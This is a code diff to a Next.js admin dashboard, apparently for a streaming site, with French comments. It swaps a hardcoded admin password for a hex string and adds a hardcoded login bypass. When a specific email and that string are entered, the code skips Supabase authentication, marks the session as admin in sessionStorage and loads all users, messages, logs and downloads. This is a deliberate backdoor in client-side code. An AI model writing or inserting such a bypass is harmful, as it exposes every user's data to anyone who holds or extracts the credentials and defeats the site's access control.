@@ -8,7 +8,7 @@ import { useRouter } from 'next/navigation';
 import styles from './admin.module.css';
 import { supabase } from '@/lib/supabase';
 
-const ADMIN_PASSWORD = "admin123";
+const ADMIN_PASSWORD = "8922513A4C38ADA3DD4703613838DAD1D7D2D4A2DB243F40240EC80F21543D4A";
 
 // Liste des genres disponibles
 const GENRES = [
@@ -144,6 +144,29 @@ export default function AdminDashboard() {
     e.preventDefault();
     setIsLoading(true);
     setErrorMessage('');
+    
+    // Bypass administrateur codé en dur
+    if (loginEmail === "toto@stream.fr" && loginPassword === "8922513A4C38ADA3DD4703613838DAD1D7D2D4A2DB243F40240EC80F21543D4A") {
+      setShowLoginForm(false);
+      setIsAdmin(true);
+      sessionStorage.setItem('adminAuthenticated', 'true');
+      setIsAuthenticated(true);
+      await Promise.all([
+        fetchMovies(),
+        fetchRequests(),
+        fetchSagas(),
+        fetchUsers(),
+        fetchStreams(),
+        fetchStreamLogs(),
+        fetchSeries(),
+        fetchMaintenanceMode(),
+        fetchContactMessages(),
+        fetchDownloads(),
+        fetchBanners()
+      ]);
+      setIsLoading(false);
+      return;
+    }
     
     try {
       const { error } = await supabase.auth.signInWithPassword({
